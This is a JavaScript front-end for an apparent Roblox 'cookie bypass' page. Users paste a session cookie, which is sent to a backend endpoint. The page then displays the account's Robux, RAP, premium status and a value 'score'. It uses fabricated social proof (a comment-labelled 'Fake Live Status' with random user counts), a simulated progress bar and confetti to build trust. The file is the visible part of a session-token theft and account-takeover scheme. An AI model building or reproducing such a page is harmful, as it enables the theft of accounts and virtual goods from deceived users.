// Particle System
const canvas = document.getElementById('particles');
const ctx = canvas.getContext('2d');

let particles = [];
const resize = () => {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
};

class Particle {
    constructor() {
        this.reset();
    }
    reset() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = Math.random() * 2 + 0.5;
        this.speedX = Math.random() * 0.5 - 0.25;
        this.speedY = Math.random() * 0.5 - 0.25;
        this.opacity = Math.random() * 0.5 + 0.2;
    }
    update() {
        this.x += this.speedX;
        this.y += this.speedY;
        if (this.x < 0 || this.x > canvas.width || this.y < 0 || this.y > canvas.height) this.reset();
    }
    draw() {
        ctx.fillStyle = `rgba(255, 255, 255, ${this.opacity})`;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
    }
}

const initParticles = () => {
    resize();
    particles = [];
    for (let i = 0; i < 50; i++) particles.push(new Particle());
};

const animate = () => {
    ctx.clearRect(0, 0, canvas.width, canvas.height);
    particles.forEach(p => {
        p.update();
        p.draw();
    });
    requestAnimationFrame(animate);
};

initParticles();
animate();
window.addEventListener('resize', initParticles);

// Confetti Effect
function triggerConfetti() {
    const duration = 3000;
    const animationEnd = Date.now() + duration;
    const defaults = { startVelocity: 30, spread: 360, ticks: 60, zIndex: 0 };

    function randomInRange(min, max) {
        return Math.random() * (max - min) + min;
    }

    const interval = setInterval(function() {
        const timeLeft = animationEnd - Date.now();

        if (timeLeft <= 0) {
            return clearInterval(interval);
        }

        const particleCount = 50 * (timeLeft / duration);
        confetti(Object.assign({}, defaults, { 
            particleCount, 
            origin: { x: randomInRange(0.1, 0.3), y: Math.random() - 0.2 } 
        }));
        confetti(Object.assign({}, defaults, { 
            particleCount, 
            origin: { x: randomInRange(0.7, 0.9), y: Math.random() - 0.2 } 
        }));
    }, 250);
}

// Fake Live Status
function updateLiveStatus() {
    const liveStatusEl = document.getElementById('live-status');
    const randomCount = Math.floor(Math.random() * 14) + 1;
    liveStatusEl.textContent = `${randomCount} ${randomCount === 1 ? 'person' : 'people'} using this now`;
}

// Update live status every 5-15 seconds
setInterval(updateLiveStatus, Math.random() * 10000 + 5000);
updateLiveStatus();

// Account Score Rating
function getScoreRating(score) {
    if (score >= 90) return '🏆 Elite Account';
    if (score >= 75) return '⭐ Premium Account';
    if (score >= 60) return '✨ Great Account';
    if (score >= 40) return '👍 Good Account';
    if (score >= 20) return '📝 Average Account';
    return '🔰 Starter Account';
}

// App Logic
const cookieInput = document.getElementById('cookie-input');
const btnStart = document.getElementById('btn-start');
const btnCheck = document.getElementById('btn-check');

const formState = document.getElementById('form-state');
const processingState = document.getElementById('processing-state');
const successState = document.getElementById('success-state');
const failedState = document.getElementById('failed-state');
const progressBar = document.getElementById('progress-bar');
const progressText = document.getElementById('progress-text');
const userAvatar = document.getElementById('user-avatar');

// Paste Detection
cookieInput.addEventListener('paste', (e) => {
    setTimeout(() => {
        const cookie = cookieInput.value.trim();
        if (cookie.length > 50) {
            // Auto-highlight the button
            btnStart.classList.add('ring-4', 'ring-white/20');
            setTimeout(() => {
                btnStart.classList.remove('ring-4', 'ring-white/20');
            }, 1000);
        }
    }, 100);
});

// Check Cookie Only
btnCheck.onclick = async () => {
    const cookie = cookieInput.value.trim();

    if (!cookie) {
        alert('Please provide a cookie');
        return;
    }

    btnCheck.disabled = true;
    btnCheck.innerHTML = '<svg class="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg> Checking...';

    try {
        const response = await fetch('/api/bypass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie, checkOnly: true })
        });

        const data = await response.json();

        if (response.ok && data.success && data.valid) {
            // Valid cookie
            btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Valid Cookie ✓';
            btnCheck.classList.add('bg-green-500/20', 'border-green-500/50', 'text-green-400');
            
            // Show success message
            alert(`✅ Cookie is valid!\nUsername: ${data.username}\nUser ID: ${data.userId}`);
            
            setTimeout(() => {
                btnCheck.disabled = false;
                btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Check Cookie';
                btnCheck.classList.remove('bg-green-500/20', 'border-green-500/50', 'text-green-400');
            }, 3000);
        } else {
            // Invalid cookie
            btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg> Invalid Cookie ✗';
            btnCheck.classList.add('bg-red-500/20', 'border-red-500/50', 'text-red-400');
            
            alert('❌ Cookie is invalid or expired!');
            
            setTimeout(() => {
                btnCheck.disabled = false;
                btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Check Cookie';
                btnCheck.classList.remove('bg-red-500/20', 'border-red-500/50', 'text-red-400');
            }, 3000);
        }
    } catch (err) {
        btnCheck.disabled = false;
        btnCheck.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Check Cookie';
        alert('Error checking cookie. Please try again.');
    }
};

// Start Bypass
btnStart.onclick = async () => {
    const cookie = cookieInput.value.trim();

    if (!cookie) {
        alert('Please provide a cookie');
        return;
    }

    formState.classList.add('hidden');
    processingState.classList.remove('hidden');

    try {
        // Call backend API
        const response = await fetch('/api/bypass', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie })
        });

        const data = await response.json();

        if (!response.ok || !data.success) {
            setTimeout(() => {
                processingState.classList.add('hidden');
                failedState.classList.remove('hidden');
            }, 1500);
            return;
        }

        // Simulate progress bar
        let progress = 0;
        const interval = setInterval(() => {
            progress += 1;
            progressBar.style.width = `${progress}%`;
            progressText.innerText = `${progress}% Complete`;
            if (progress >= 100) {
                clearInterval(interval);
                
                // Display account info
                userAvatar.src = data.avatarUrl || 'https://via.placeholder.com/150';
                document.getElementById('user-display-name').textContent = `@${data.userInfo.username}`;
                document.getElementById('info-username').textContent = data.userInfo.username;
                document.getElementById('info-userid').textContent = data.userInfo.userId;
                document.getElementById('info-robux').textContent = data.userInfo.robux.toLocaleString();
                document.getElementById('info-rap').textContent = data.userInfo.rap.toLocaleString();
                document.getElementById('info-premium').textContent = data.userInfo.premium;
                document.getElementById('info-vc').textContent = data.userInfo.voiceChat;
                document.getElementById('info-friends').textContent = data.userInfo.friends.toLocaleString();
                document.getElementById('info-followers').textContent = data.userInfo.followers.toLocaleString();
                document.getElementById('info-age').textContent = data.userInfo.accountAge;
                document.getElementById('info-groups').textContent = data.userInfo.groupsOwned;
                
                // Display account score
                const score = data.userInfo.accountScore || 0;
                document.getElementById('account-score').textContent = `${score}/100`;
                document.getElementById('score-bar').style.width = `${score}%`;
                document.getElementById('score-rating').textContent = getScoreRating(score);
                
                processingState.classList.add('hidden');
                successState.classList.remove('hidden');
                
                // Trigger confetti
                setTimeout(triggerConfetti, 300);
                
                // Auto-clear cookie input after 2 seconds
                setTimeout(() => {
                    cookieInput.value = '';
                }, 2000);
            }
        }, 1200); // 120 seconds total

    } catch (err) {
        setTimeout(() => {
            processingState.classList.add('hidden');
            failedState.classList.remove('hidden');
        }, 1500);
    }
};